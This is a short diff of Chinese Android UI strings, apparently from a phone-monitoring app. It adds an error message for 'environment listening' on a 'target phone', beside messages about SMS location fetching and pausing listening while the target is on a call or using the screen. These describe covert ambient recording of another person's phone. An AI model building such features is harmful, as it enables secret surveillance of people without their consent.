@@ -54,6 +54,7 @@
     <string name="location_sms_fail">抱歉，当前无法获得所在位置，请稍后再试。若一直无法解决请联系客服。</string>
     
     <!-- Environment Listening -->
+    <string name="env_fail_exception">目标手机发生运行错误，现在无法进行环境监听。</string>
     <string name="env_fail_offhook">目标手机正通话中，现在无法进行环境监听。</string>
     <string name="env_fail_screen_on">对方正在操作目标手机，现在无法进行环境监听。</string>
     
